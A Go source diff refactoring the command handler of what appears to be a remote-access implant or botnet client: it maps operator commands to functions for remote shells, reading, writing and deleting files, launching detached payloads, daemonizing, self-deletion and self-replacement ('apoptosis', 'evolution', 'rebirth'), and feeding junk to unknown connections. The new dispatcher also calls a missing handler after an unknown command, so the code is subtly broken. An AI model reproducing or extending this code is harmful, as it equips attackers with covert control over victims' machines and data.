@@ -19,8 +19,9 @@ import (
 
 	"io/ioutil"
 	"fmt"
-	"bytes"
 )
+
+var ops map[string](func (string, net.Conn, *Client, *smux.Session)())
 
 type Client struct {
 	UUID       []byte
@@ -40,6 +41,7 @@ type Client struct {
 }
 
 func NewClient() (*Client) {
+	initOps()
 	return &Client{
 		AgentTag: clientAgentTag,
 		HubKeyTag: initKeyTag,
@@ -50,6 +52,7 @@ func NewClient() (*Client) {
 }
 
 func NewClientM() (*Client) {
+	initOps()
 	return &Client{
 		AgentTag: clientAgentTag,
 		HubKeyTag: initKeyTag,
@@ -57,6 +60,30 @@ func NewClientM() (*Client) {
 		Info: NewInfo(),
 		Daemon: false,
 	}
+}
+
+var initOps = func () {
+	if ops != nil {
+		return
+	}
+
+	ops = make(map[string](func (string, net.Conn, *Client, *smux.Session)()))
+
+	ops[B_info] = pullInfo
+	ops[B_fast] = fastC
+	ops[B_reconn] = ccX
+	ops[B_kill] = ccX
+
+	ops[B_shs] = sh
+	ops[B_shk] = sh
+	ops[B_csh] = sh
+
+	ops[B_dodaemon] = ccX
+	ops[B_apoptosis] = ccX
+	ops[B_rebirth] = ccX
+	ops[B_evolution] = ccX
+
+	ops[B_fs] = ccFs
 }
 
 func (c *Client) Start(addr string) {
@@ -193,172 +220,14 @@ func (c *Client) handle1(p1 net.Conn, mux *smux.Session) {
 	//Vln(3, "Mode:", mode)
 	defer p1.Close()
 
-	var checkSup = func() (exit bool) {
-		switch runtime.GOOS {
-		case "linux":
-			fallthrough
-		case "darwin":
-			kit.WriteVLen(p1, int64(0))
-			exit = false
-
-		case "windows":
-			kit.WriteVLen(p1, int64(-2))
-			exit = true
-		}
-
-		return exit
-	}
-
-	switch mode {
-	case B_shk:
-		kit.WriteVLen(p1, int64(0))
-		bin, err := kit.ReadVTagByte(p1)
-		if err != nil {
-			break
-		}
-		//Vln(2, "sh2k start")
-		c.handle2(p1, true, string(bin))
-		//Vln(2, "sh2k end")
-
-	case B_sh:
-		kit.WriteVLen(p1, int64(0))
-		bin, err := kit.ReadVTagByte(p1)
-		if err != nil {
-			break
-		}
-		//Vln(2, "sh2g start")
-		c.handle2(p1, false, string(bin))
-		//Vln(2, "sh2g end")
-
-	case B_info:
-		kit.WriteVLen(p1, int64(0))
-		c.Info.WriteTo(p1)
-
-	case B_fast:
-		kit.WriteVLen(p1, int64(0))
-		handleFastS(p1)
-
-	case B_reconn:
-		kit.WriteVLen(p1, int64(0))
-		mux.Close()
-
-	case B_kill:
-		kit.WriteVLen(p1, int64(0))
-		os.Exit(0)
-
-
-	case B_dodaemon:
-		kit.WriteVLen(p1, int64(0))
-		godaemon.MakeDaemon(&godaemon.DaemonAttr{})
-
-	case B_apoptosis:
-		if checkSup() {
-			break
-		}
-		cleanSelf()
-		kit.WriteVLen(p1, int64(0))
-
-	case B_evolution:
-		kit.WriteVLen(p1, int64(0))
-		fhb, err := kit.ReadVTagByte(p1)
-		if err != nil {
-//fmt.Println("[evolution][err]fhb", err)
-			break
-		}
-
-		fb, err := kit.ReadVTagByte(p1)
-		if err != nil {
-//fmt.Println("[evolution][err]fb", err)
-			break
-		}
-
-		checkb := kit.HashBytes256(fb)
-//fmt.Println("[evolution]", len(fb), kit.Hex(checkb), kit.Hex(fhb))
-		if !bytes.Equal(checkb, fhb) {
-//fmt.Println("[evolution][err]!bytes.Equal", kit.Hex(checkb), kit.Hex(fhb))
-			break
-		}
-
-		c.selfbyte = fb
-		c.selfhex = fhb
-		fallthrough
-
-	case B_rebirth:
-		kit.WriteVLen(p1, int64(0))
-		dumpSelf(c)
-
-	case B_get:
-		kit.WriteVLen(p1, int64(0))
-		fp, err := kit.ReadVTagByte(p1)
-		if err != nil {
-			break
-		}
-		fd, err := os.OpenFile(string(fp), os.O_RDONLY, 0444)
-		if err != nil {
-			// can't open file
-			break
-		}
-		defer fd.Close()
-		finfo, err := fd.Stat()
-		if err != nil {
-			// can't stat file
-			break
-		}
-		kit.WriteVLen(p1, finfo.Size())
-		kit.Cp1(fd, p1)
-
-	case B_push:
-		kit.WriteVLen(p1, int64(0))
-
-		fp, err := kit.ReadVTagByte(p1)
-		if err != nil {
-			break
-		}
-		fd, err := os.OpenFile(string(fp), os.O_WRONLY | os.O_CREATE | os.O_TRUNC , 0700)
-		if err != nil {
-			// can't create file
-			return
-		}
-		defer fd.Close()
-		kit.Cp1(p1, fd)
-
-	case B_del:
-		kit.WriteVLen(p1, int64(0))
-
-		fp, err := kit.ReadVTagByte(p1)
-		if err != nil {
-			kit.WriteVLen(p1, int64(-1))
-			break
-		}
-		err = os.RemoveAll(string(fp))
-		if err != nil {
-			kit.WriteVLen(p1, int64(-1))
-			break
-		}
-
-	case B_call:
-		kit.WriteVLen(p1, int64(0))
-
-		fpb, err := kit.ReadVTagByte(p1)
-		if err != nil {
-			break
-		}
-
-		fp := string(fpb)
-		// check exist?
-		if _, err := os.Stat(fp); os.IsNotExist(err) {
-			kit.WriteVLen(p1, int64(-2))
-			return
-		} else {
-			kit.WriteVLen(p1, int64(0))
-		}
-		call(p1, fp)
-
-	default:
+	fn, ok := ops[mode]
+	if !ok {
 		kit.WriteVLen(p1, int64(9))
 		kit.TrollConn(p1)
 	}
 
+	kit.WriteVLen(p1, int64(0))
+	fn(mode, p1, c, mux)
 }
 
 func (c *Client) handle2(p1 net.Conn, keep bool, bin string) {
@@ -402,24 +271,6 @@ func (c *Client) handle2(p1 net.Conn, keep bool, bin string) {
 		if err != nil {
 			p1.Write([]byte(err.Error()))
 		}
-	}
-}
-
-var call = func (p1 net.Conn, bin string) {
-	// call payload
-	pl := exec.Command(bin)
-	pl.SysProcAttr = &syscall.SysProcAttr{
-		Setpgid: true,
-//		Noctty: true,
-	}
-	err := pl.Start()
-	if err != nil {
-		p1.Write([]byte(err.Error()))
-		return
-	}
-	err = pl.Process.Release()
-	if err != nil {
-		p1.Write([]byte(err.Error()))
 	}
 }
 
